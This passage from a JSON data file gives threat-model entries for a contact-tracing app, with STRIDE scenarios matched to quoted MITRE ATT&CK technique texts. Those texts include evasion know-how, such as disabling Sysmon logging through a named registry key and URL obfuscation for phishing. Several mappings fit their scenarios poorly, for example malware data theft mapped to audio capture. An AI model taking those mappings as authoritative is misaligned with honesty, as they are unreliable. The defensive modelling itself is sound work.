                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering techniques to trick a user into granting elevated privileges on their device.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to social engineering attacks.",
                    "Role": "User",
                    "Condition": "Lack of cybersecurity awareness."
                },
                {
                    "Assumption": "The application requests elevated privileges that can be exploited.",
                    "Role": "Developer",
                    "Condition": "Overly broad permission requests by the app."
                }
            ],
            "Potential Impact": "Attacker obtains access to sensitive data and functionalities, potential system-wide compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "user manipulation",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate user device by capturing and reusing exchanged IDs to gain access to sensitive contact data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical proximity to the victim's device to capture Bluetooth signals.",
                    "Role": "Attacker",
                    "Condition": "Close physical proximity."
                },
                {
                    "Assumption": "The attacker understands the protocol for ID exchange between devices.",
                    "Role": "Attacker",
                    "Condition": "Sufficient technical knowledge."
                },
                {
                    "Assumption": "The device security is weak without advanced authentication mechanisms.",
                    "Role": "Device Manufacturer",
                    "Condition": "Lack of robust authentication controls."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive contact data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "Bluetooth",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Phishing attacks trick users into divulging authentication details or keys, enabling attackers to impersonate them on the central server.",
            "Assumptions": [
                {
                    "Assumption": "Users lack sufficient awareness of phishing risks.",
                    "Role": "End Users",
                    "Condition": "Low cybersecurity awareness."
                },
                {
                    "Assumption": "The phishing messages are crafted convincingly to mimic legitimate communications.",
                    "Role": "Attacker",
                    "Condition": "High social engineering skills."
                },
                {
                    "Assumption": "There are no multifactor authentication (MFA) mechanisms in place.",
                    "Role": "Application Administrator",
                    "Condition": "Absence of MFA."
                }
            ],
            "Potential Impact": "Unauthorized data access and privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential theft",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers create fake user devices to generate bogus contact events, inflating the contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to create or emulate devices that can participate in the contact tracing protocol.",
                    "Role": "Attacker",
                    "Condition": "Access to technical tools and knowledge."
                },
                {
                    "Assumption": "The application has weak mechanisms to differentiate between real and fake devices.",
                    "Role": "Application Developer",
                    "Condition": "Lack of rigorous device validation."
                },
                {
                    "Assumption": "The central server does not implement robust anomaly detection.",
                    "Role": "Server Administrator",
                    "Condition": "Weak monitoring and detection controls."
                }
            ],
            "Potential Impact": "Manipulation of the contact tracing data integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device emulation",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Runtime Data Manipulation",
                "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1042) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--ca205a36-c1ad-488b-aa6c-ab34bdd3a36b",
                "technique_id": "T1494"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data packets exchanged between user devices and the server to alter contact information.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel between devices and the server is unsecured or poorly secured.",
                    "Role": "Network Administrator",
                    "Condition": "Weak encryption or no encryption."
                },
                {
                    "Assumption": "The attacker has network-level access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Access to the same network or ability to intercept traffic."
                },
                {
                    "Assumption": "The application does not verify the integrity of received data.",
                    "Role": "Application Developer",
                    "Condition": "Lack of data integrity checks."
                }
            ],
            "Potential Impact": "Compromise of data integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "packet injection",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with access to user devices tampers with local data, altering rolling keys or other stored information.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the user's device.",
                    "Role": "Attacker",
                    "Condition": "Physical possession of the device."
                },
                {
                    "Assumption": "Local data storage is not adequately protected with encryption or other security measures.",
                    "Role": "Application Developer",
                    "Condition": "Lack of data protection mechanisms."
                },
                {
                    "Assumption": "The application does not perform regular integrity checks.",
                    "Role": "Application Developer",
                    "Condition": "Absence of integrity validation."
                }
            ],
            "Potential Impact": "Manipulation of user data and compromise of contact tracing accuracy.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "local data manipulation",
                "device security"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the central server to tamper with the stored contact data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to server credentials or exploited a vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Successful exploitation or credential theft."
                },
                {
                    "Assumption": "Server access controls and monitoring are inadequate.",
                    "Role": "Server Administrator",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "The server does not log or alert on unauthorized data modifications.",
                    "Role": "Server Administrator",
                    "Condition": "Lack of security monitoring and alerting."
                }
            ],
            "Potential Impact": "Compromise of data integrity and possible misinformation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server exploitation",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having been at a particular location despite logs showing their presence, questioning the authenticity of app data.",
            "Assumptions": [
                {
                    "Assumption": "The user\u2019s location data is not securely tied to their identity or device.",
                    "Role": "Application Developer",
                    "Condition": "Weak or absent location data authentication."
                },
                {
                    "Assumption": "The logs are not tamper-evident or cryptographically signed.",
                    "Role": "Application Developer",
                    "Condition": "Lack of tamper-evident logging mechanisms."
                },
                {
                    "Assumption": "There is no robust audit trail for user activities.",
                    "Role": "Application Developer",
                    "Condition": "Absence of a comprehensive audit trail."
                }
            ],
            "Potential Impact": "Denial of participation and loss of trust in the application data.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log forgery",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes or alters log files to erase evidence of their unauthorized activities on the server or device.",
            "Assumptions": [
                {
                    "Assumption": "Log files are not securely stored or lack access controls.",
                    "Role": "Application Developer",
                    "Condition": "Insecure log file storage."
                },
                {
                    "Assumption": "The application does not alert on or prevent unauthorized log file modifications.",
                    "Role": "Application Developer",
                    "Condition": "Lack of file integrity monitoring."
                },
                {
                    "Assumption": "Administrative actions on log files are not logged.",
                    "Role": "Server Administrator",
                    "Condition": "Insufficient logging of administrative activities."
                }
            ],
            "Potential Impact": "Evasion of detection and loss of accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log file tampering",
                "evidence deletion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider with administrative access denies triggering sensitive data exfiltration despite system logs indicating their actions.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient segregation of duties allowing for undetected malicious actions.",
                    "Role": "System Administrator",
                    "Condition": "Poor role-based access control."
                },
                {
                    "Assumption": "Logs are not immutable or tamper-proof.",
                    "Role": "System Administrator",
                    "Condition": "Logs can be altered or deleted."
                },
                {
                    "Assumption": "Monitoring and alerting mechanisms are inadequate to detect malicious administrator actions.",
                    "Role": "Security Team",
                    "Condition": "Weak monitoring setup."
                }
            ],
            "Potential Impact": "Loss of data integrity and security compromise.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Event Triggered Execution",
                "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",
                "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
                "technique_id": "T1546"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker listens to unencrypted communication between user devices and the central server, capturing sensitive contact information.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted or use weak encryption protocols.",
                    "Role": "Network Administrator",
                    "Condition": "Poor encryption practices."
                },
                {
                    "Assumption": "The attacker has network-level access to intercept communication.",
                    "Role": "Attacker",
                    "Condition": "Access to the network."
                },
                {
                    "Assumption": "There are no network monitoring or intrusion detection systems in place.",
                    "Role": "Security Team",
                    "Condition": "Lack of network security monitoring."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive health data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted communication",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An authorized user with legitimate access to the system inadvertently exposes sensitive contact data through insecure app configurations.",
            "Assumptions": [
                {
                    "Assumption": "Users are not adequately trained on data protection best practices.",
                    "Role": "Organization",
                    "Condition": "Inadequate user training."
                },
                {
                    "Assumption": "Application configurations allow for broad access without fine-grained controls.",
                    "Role": "Application Developer",
                    "Condition": "Insecure configuration settings."
                },
                {
                    "Assumption": "Sensitive data does not have proper access control measures in place.",
                    "Role": "System Administrator",
                    "Condition": "Lack of access control policies."
                }
            ],
            "Potential Impact": "Unintended exposure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "misconfiguration",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malware installed on user devices collects health data from the app and sends it to unauthorized third parties.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack robust anti-malware protections.",
                    "Role": "User",
                    "Condition": "Inadequate device security."
                },
                {
                    "Assumption": "The malware is capable of accessing and exfiltrating data from the app.",
                    "Role": "Malware Developer",
                    "Condition": "Advanced malware capabilities."
                },
                {
                    "Assumption": "The application does not incorporate effective data encryption and protection mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "Insecure data handling practices."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of health and contact data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Audio Capture",
                "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
                "technique_id": "T1123"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the central server, disrupting the contact tracing services and exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "The server has limited mitigation measures against high-volume DDoS attacks.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of robust DDoS protection."
                },
                {
                    "Assumption": "The attacker has the resources to generate massive amounts of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other resources."
                },
                {
                    "Assumption": "There is no redundancy or failover mechanism in place for the server.",
                    "Role": "System Administrator",
                    "Condition": "Single point of failure."
                }
            ],
            "Potential Impact": "Disruption of service availability affecting data collection and notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a known vulnerability in the mobile application to crash it repeatedly, preventing users from accessing the contact tracing features.",
            "Assumptions": [
                {
                    "Assumption": "The application has an unpatched vulnerability that can be remotely exploited.",
                    "Role": "Application Developer",
                    "Condition": "Known but unpatched vulnerability."
                },
                {
                    "Assumption": "Users do not have alternate means of access to the service.",
                    "Role": "End Users",
                    "Condition": "Dependence on the affected application."
                },
                {
                    "Assumption": "There is no effective detection and response system for application crashes.",
                    "Role": "Application Developer",
                    "Condition": "Lack of crash monitoring."
                }
            ],
            "Potential Impact": "Service unavailability for affected users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "application crash",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Concurrent access by multiple malicious actors overwhelms the central server's resources, leading to performance degradation or complete outage.",
            "Assumptions": [
                {
                    "Assumption": "The server lacks rate-limiting mechanisms to handle excessive requests.",
                    "Role": "Server Administrator",
                    "Condition": "Absence of request throttling."
                },
                {
                    "Assumption": "Malicious actors can coordinate and initiate simultaneous requests.",
                    "Role": "Attacker",
                    "Condition": "Coordination and resource availability."
                },
                {
                    "Assumption": "There is no automated scaling capability to handle peak loads.",
                    "Role": "Server Administrator",
                    "Condition": "Fixed resource allocation."
                }
            ],
            "Potential Impact": "Performance degradation or complete service outage.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "server overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a privilege escalation vulnerability in the mobile app to access administrative functions.",
            "Assumptions": [
                {
                    "Assumption": "The mobile app contains a vulnerability that allows privilege escalation.",
                    "Role": "Application Developer",
                    "Condition": "Existing vulnerability within the code."
                },
                {
                    "Assumption": "The attacker identifies and successfully exploits this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Technical expertise and persistence."
                },
                {
                    "Assumption": "There are insufficient internal controls to detect and prevent unauthorized privilege usage.",
                    "Role": "Application Developer",
                    "Condition": "Weak internal control mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to administrative functions and potential data tampering.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "administrative access"
